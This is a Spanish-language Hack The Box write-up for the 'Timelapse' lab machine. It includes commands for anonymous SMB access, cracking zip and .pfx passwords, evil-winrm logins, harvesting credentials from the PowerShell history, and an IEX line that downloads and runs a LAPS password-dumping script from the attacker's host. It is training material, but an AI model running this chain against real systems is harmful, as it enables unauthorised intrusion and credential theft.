---
layout: single
title: Timelapse - Hack The Box
excerpt: "En esta máquina fácil Windows econtraremos un archivo .zip expuesto en el servicio **SMB** el cuál podremos crackear su contraseña con **zip2john**. Dentro habrá un archivo **.pfx** donde podremos obtener un certificado y una clave privada. Antes tendremos que averiguar la contraseña con herramientas como **pfx2john** o **crackpkcs12**. Una vez hecho esto nos podremos conectar al servicio **winrm por ssl** con la herramienta **evil-winrm**. En nuestro camino para convertirnos en Administrator encontraremos unas credenciales en el **histórico de powershell** y posteriormente nos aprovecharmos del grupo **LDAP_readers** para obtener la contraseña del Administrador"
date: 2023-09-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-timelapse/timelapse_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Windows
  - Crack Zip
  - Extract public and private key in .pfx
  - Powershell History
  - LAPS Readers
---

![](/assets/images/htb-writeup-timelapse/timelapse_logo.png)

# Enumeración
Puertos abiertos:
![](/assets/images/htb-writeup-timelapse/nmap_timelapse.png)
Al encontrarnos tantos puertos abiertos debemos seguir un orden para no hacernos un lio. Empezaremos por el **puerto 445 (SMB)**.
```bash
smbmap -H 10.10.11.152 -u 'NULL'
```
Con esto veremos que podemos leer la carpeta **Shares**. usando el parametro -r de smbmap podremos listar lo que hay dentros de dichas carpetas.
```bash
smbmap -H 10.10.11.152 -u 'NULL' -r Shares/Dev
```
![](/assets/images/htb-writeup-timelapse/smbmap_timelapse.png)
Para descargarnos el archivo tenemos el parametro --download
```bash
smbmap -H 10.10.11.152 -u 'NULL' --download Shares/Dev/winrm_backup.zip 
```
A la hora de unzipearlo nos pide una contraseña. Momento de usar **zip2john** y crackear el hash con **john**
```bash
zip2john winrm_backup.zip > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```
Con esto obtenemos el archivo **legacyy_dev_auth.pfx** pero ¿Qué es un archivo .pfx? Con una rapida búsqueda en Google veremos que las características de estos archivos incluyen **certificados digitales** utilizados para procesos de autenticación necesarios para determinar si un usuario o un dispositivo puede acceder a ciertos archivos o a un equipo. Ahora bien, **¿Cómo obtenemos estos certificados?** Pues lo podemos hacer con la herramienta **openssl**

Extraemos la clave privada:
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out clave_privada.key -nodes
```
Extreamos el certificado:
```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificado.pem
```
Pero vemos que al hacerlo nos pide una contraseña. Siguiendo el mismo procedimiento que con el archivo .zip podemos usar **pfx2john** o **crackpkcs12.**
Para descargar crackpkcs12: [Descargar](https://github.com/crackpkcs12/crackpkcs12)
```bash
pfx2john legacyy_dev_auth.pfx > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```
```bash
crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
```
Ahora con esta contraseña podremos crear nuestros certificados y con **evil-winrm** conectarnos por ssl ya que está abierto el puerto **5986** y no el 5985
```bash
evil-winrm -i 10.10.11.152 -k clave_privada.key -c certificado.pem --ssl
```
# Escalada de privilegios usuario legacyy
Esta máquina no nos dejaba usar **winPEAS.exe** por lo que tenemos que ir enumerandolo manualmente. Mirando en **hacktricks** vemos una manera de **leer el historico de powershell** donde se pueden estar guardando comandos interesantes. Para verlo hacemos:
```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Y sorpresa!, encontramos las credenciales de **svc_deploy** pero ¿Para que íbamos a querer convertirnos en este usuario? Pues bien si nos conectamos como ese usuario con **evil-winrm** ya que forma parte del grupo **Remote Managment Users**. Para conectarnos como ese usuario con evil-winrm:
```bash
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```
Si vemos los grupos a los que pertenece con este comando, veremos que se encuentra en el grupo **LAPS_readers**
```powershell
net user svc_deploy
```
![](/assets/images/htb-writeup-timelapse/grupo_svc_deploy.png)
# Escalada de privilegios usuario svc_deploy
## ¿Qué privilegios otorga el grupo LAPS_readers?
Los usuarios que forman parte de este grupo pueden gestionar las contraseñas de las cuentas locales de los ordenadores conectados a un dominio. Es decir, podemos leer la contraseña de los usuarios, como el de Administrador. Ahora bien, ¿cómo lo hacemos? Usaremos el siguiente script en powershell: [Get-LAPSPasswords](https://github.com/kfosaaen/Get-LAPSPasswords)
<br>Nos montaremos un servidor en python3 en nuestra máquina:
```bash
python3 -m http.server 80
```
Y nos lo transmitiremos a la máquina con este comando. Así lo interpretaremos a la vez que lo pasamos a la máquina.
```powershell
IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x/Get-LAPSPasswords.ps1')
```
Una vez dentro solo tendremos que escribir: **Get-LAPSPasswords**
![](/assets/images/htb-writeup-timelapse/Get-LAPSPassword.png)
<br>Y por último, nos conectariamos con **evil-winrm** como el usuario **Administrador** con esa contraseña :D
